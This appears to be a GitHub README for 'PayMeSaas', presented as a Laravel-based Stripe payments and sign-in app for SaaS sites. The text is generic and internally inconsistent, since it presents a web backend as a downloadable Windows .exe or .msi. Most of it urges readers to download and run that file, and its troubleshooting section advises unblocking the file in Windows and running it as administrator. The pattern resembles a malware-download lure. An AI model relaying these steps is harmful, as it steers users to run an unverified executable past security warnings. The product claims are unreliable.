# 💳 PayMeSaas - Simple Stripe Payments for SaaS

[![Download PayMeSaas](https://img.shields.io/badge/Download%20PayMeSaas-blue?style=for-the-badge&logo=github)](https://github.com/Angeln2621/PayMeSaas/releases)

## 📥 Download

Visit this page to download: https://github.com/Angeln2621/PayMeSaas/releases

Download the latest Windows release file from that page, then open it on your PC. If you see more than one file, choose the one that ends in `.exe` or `.msi`

## 🖥️ What PayMeSaas Does

PayMeSaas is a checkout payment app built on Stripe. It helps you take card payments, manage sign-in, and run a simple SaaS-style site.

Use it if you want a basic payment flow with:
- 💳 Stripe checkout
- 🔐 User sign-in
- 📊 Payment tracking
- ⚡ A Laravel backend
- 🧩 A setup made for SaaS apps

## ✅ Before You Start

Make sure your Windows PC has:
- Windows 10 or newer
- An internet connection
- A browser such as Edge, Chrome, or Firefox
- Permission to open downloaded files
- Enough free space for the app and its files

You may also need:
- A Stripe account
- An email account for sending sign-in emails
- A folder where you want to keep the app files

## 🚀 Install on Windows

1. Open this page in your browser: https://github.com/Angeln2621/PayMeSaas/releases

2. Find the newest release at the top of the page.

3. In the release files, look for the Windows download. It may be named like:
   - `PayMeSaas.exe`
   - `PayMeSaas-setup.msi`
   - `PayMeSaas-windows.zip`

4. Download the file.

5. If you downloaded a `.zip` file, right-click it and choose **Extract All**.

6. Open the extracted folder.

7. Double-click the app file:
   - `.exe` files run the app
   - `.msi` files open the setup screen

8. If Windows asks for permission, choose **Yes**.

9. Follow the on-screen steps until the app opens.

## 🏃 First Run

When you open PayMeSaas for the first time, it may ask for setup details. Use the values from your app provider or hosting setup.

Common setup items include:
- App name
- Site address
- Stripe keys
- Email settings
- Database details

If the app starts with a login screen, create your first account if the app allows it, or use the admin account you set up during install

## 🔧 Setup Details

PayMeSaas uses Stripe for payments. To make payments work, you need valid Stripe keys in the app settings.

You may also need to set:
- `APP_DOMAIN` to your site address
- SMTP details for email
- Database settings for saved data
- Queue settings for background tasks

If the app includes a settings page, open it after setup and enter the values there. If it uses a config file, edit that file before you start the app again

## 🛠️ Main Features

- 💳 Accept card payments through Stripe
- 🔐 Let users create accounts and sign in
- 📊 Show payment status and activity
- 🎯 Support a SaaS-style app layout
- ⚡ Use a fast Laravel-based backend
- 🚀 Work with a production-style deployment setup

## 📧 Email Setup

Email verification is turned on. That means the app may send a message when a user signs up.

Set up email if you want:
- New user verification
- Password reset emails
- Account notices

You will usually need:
- SMTP host
- SMTP port
- Email username
- Email password
- Sender email address

If email is not set, sign-up and password reset flows may not work as expected

## 💳 Stripe Setup

To use payments, connect the app to Stripe.

You will need:
- Stripe publishable key
- Stripe secret key
- Stripe webhook settings if used by your setup

Use Stripe test mode first so you can check the checkout flow without real charges.

Typical payment flow:
1. User chooses a plan or payment option
2. The app sends the user to Stripe checkout
3. Stripe confirms the payment
4. The app updates the user account or order status

## 🗂️ Files and Data

PayMeSaas may create or use these folders:
- `storage` for app data
- `logs` for error files
- `cache` for saved app data
- `uploads` for user files, if enabled

Keep these folders in the same place as the app unless your setup says otherwise

## 🔄 Updating the App

When a new release is available:
1. Download the new Windows file from the releases page
2. Close the app
3. Replace the old file with the new one
4. Open the updated file

If the app stores settings in a separate file, keep a copy before you update

## ❓ Common Problems

### The app does not open
- Make sure you downloaded the Windows file
- Check that the download finished
- Try opening the file as administrator
- Extract the ZIP file first if you downloaded one

### Windows blocks the file
- Right-click the file
- Open **Properties**
- Choose **Unblock** if you see that option
- Run the file again

### Payments do not work
- Check your Stripe keys
- Confirm test mode or live mode matches your setup
- Make sure the webhook address is correct, if you use webhooks

### Email does not send
- Check the SMTP details
- Make sure the sender email is valid
- Confirm your mail provider allows app passwords or SMTP access

### Sign-in does not work
- Check that the database is set up
- Make sure the app can save user data
- Confirm email verification is complete if the app requires it

## 📌 How to Use It

1. Open the app in your browser or desktop window
2. Sign up or log in
3. Choose a payment plan or checkout option
4. Complete the Stripe payment
5. Use the app features tied to your account

## 🔍 For Site Owners

If you run this as your own app, keep these items ready:
- Domain name
- Stripe account
- Email service
- Secure hosting
- Backup plan for files and data

Set the domain name before going live so links and emails point to the right place

## 📎 Download Again

If you need the installer again, use this page:
https://github.com/Angeln2621/PayMeSaas/releases

Download the latest Windows file from that page and run it on your PC